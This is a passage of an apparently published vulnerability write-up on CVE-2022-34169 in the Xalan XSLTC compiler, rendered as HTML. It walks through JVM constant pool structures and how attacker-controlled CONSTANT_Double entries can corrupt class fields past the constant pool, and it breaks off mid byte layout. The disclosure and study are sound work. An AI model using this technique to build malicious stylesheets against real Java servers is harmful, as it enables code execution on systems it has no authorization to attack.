#808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">9</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">10</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">11</span></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Reference to a class field or method. Links to a Class constant&nbsp;</span></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CONSTANT_Fieldref_info {</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u1 tag;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 class_index;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 name_and_type_index;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CONSTANT_Methodref_info {</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u1 tag;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 class_index;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 name_and_type_index;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CONSTANT_InterfaceMethodref_info {</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u1 tag;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 class_index;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 name_and_type_index;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><br /></td></tr><tr style="height: 23.5pt;"><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><a href="http://constant_nameandtype_info" style="text-decoration-line: none;"><span style="background-color: transparent; color: #1155cc; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">CONSTANT_NameAndType</span></a></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">12</span></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Describes a field or method.</span></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CONSTANT_NameAndType_info {</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u1 tag;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 name_index;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 descriptor_index;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><br /></td></tr><tr style="height: 23.5pt;"><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.8" style="text-decoration-line: none;"><span style="background-color: transparent; color: #1155cc; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">CONSTANT_MethodHandle</span></a></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">15</span></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Describes a method handle.</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;</span></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CONSTANT_MethodHandle_info {</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u1 tag;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u1 reference_kind;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 reference_index;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><br /></td></tr><tr style="height: 23.5pt;"><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.9" style="text-decoration-line: none;"><span style="background-color: transparent; color: #1155cc; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">CONSTANT_MethodType</span></a></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">16</span></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Describes a method type. Points to a UTF8 constant containing a method descriptor.</span></p></td><td style="background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CONSTANT_MethodType_info {</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u1 tag;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 descriptor_index;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><br /></td></tr></tbody></table></div><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">A perfect constant type for exploiting CVE-2022-34169 would be dynamically sized containing fully attacker controlled content. Unfortunately, no such type exists. While CONSTANT_Utf8 is dynamically sized, its content isnt a raw string representation but an encoding format JVM calls modified UTF-8. This encoding introduces some significant restrictions on the data stored and rules out null bytes, making it mostly useless for corrupting class fields.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The next best thing we can get is a fixed size constant type with full control over the content. CONSTANT_Long seems like an obvious candidate, but XSLTC never creates attacker-controlled long constants during the compilation process. Instead we can use large floating numbers to create CONSTANT_Double entry with (almost) fully controlled content. This gives us a nice primitive where we can corrupt class fields behind the constant pool with a byte pattern like </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">0x06</span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #c53929; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0xXX 0xXX 0xXX 0xXX 0xXX 0xXX 0xXX 0xXX </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">0x06</span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #3367d6; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0xYY 0xYY 0xYY 0xYY 0xYY 0xYY 0xYY 0xYY</span><span style="color: #c53929; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">0x06</span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #ff9900; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0xZZ 0xZZ 0xZZ 0xZZ 0xZZ 0xZZ 0xZZ 0xZZ</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Unfortunately, this primitive alone isnt sufficient for crafting a useful class file due to the requirements of the fields right after the constant_pool:</span></p><br /><div align="left" dir="ltr" style="margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp; &nbsp; cp_info&nbsp; &nbsp; &nbsp; &nbsp; constant_pool</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">[</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">constant_pool_count</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">-</span><span style="background-color: transparent; color: #c53929; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">1</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">];</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; access_flags</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; this_class</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; super_class</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p></td></tr></tbody></table></div><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">access_flags</span><span style="font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">is a big endian mask of </span><a href="https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.7:~:text=Table%C2%A04.1%2DB.%C2%A0Class%20access%20and%20property%20modifiers" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">flags</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> describing access permissions and properties of the class.&nbsp;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">While the JVM is happy to ignore unknown flag values, we need to avoid setting flags like ACC_INTERFACE (0x0200) or ACC_ABSTRACT (0x0400) that result in an unusable class. This means that we cant use a CONSTANT_Double entry as our first out-of-bound constant as its tag byte of 0x06 will get interpreted as these flags.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">this_class</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> is an index into the constant pool and has to point to a CONSTANT_Class entry that describes the class defined with this file. Fortunately, neither the JVM nor XSLTC cares much about which class we pretend to be, so this value can point to almost any CONSTANT_Class entry that XSLTC ends up generating. (The only restriction is that it cant be a part of a protected namespace like java.lang.)</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">super_class</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> is another index to a CONSTANT_Class entry in the constant pool. While the JVM is happy with any class, XSLTC expects this to be a reference to the </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">org.apache.xalan.xsltc.runtime.AbstractTranslet</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> class, otherwise loading and initialization of the class file fails.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">After a lot of trial and error I ended up with the following approach to meet these requirements:</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: #24292f; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CONST_STRING</span><span style="color: #38761d; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span style="font-family: &quot;Roboto Mono&quot;, monospace; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CONST_DOUBLE</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: #fce5cd; color: #38761d; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 14pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x08 0x07 </span><span style="background-color: #fce5cd; color: red; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 14pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x02</span><span style="background-color: #fce5cd; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 14pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="font-family: &quot;Roboto Mono&quot;, monospace; font-size: 14pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;</span><span style="background-color: #fce5cd; color: red; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 14pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x06 </span><span style="background-color: #fce5cd; color: #ff9900; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 14pt; font-variant-east-asian: normal; 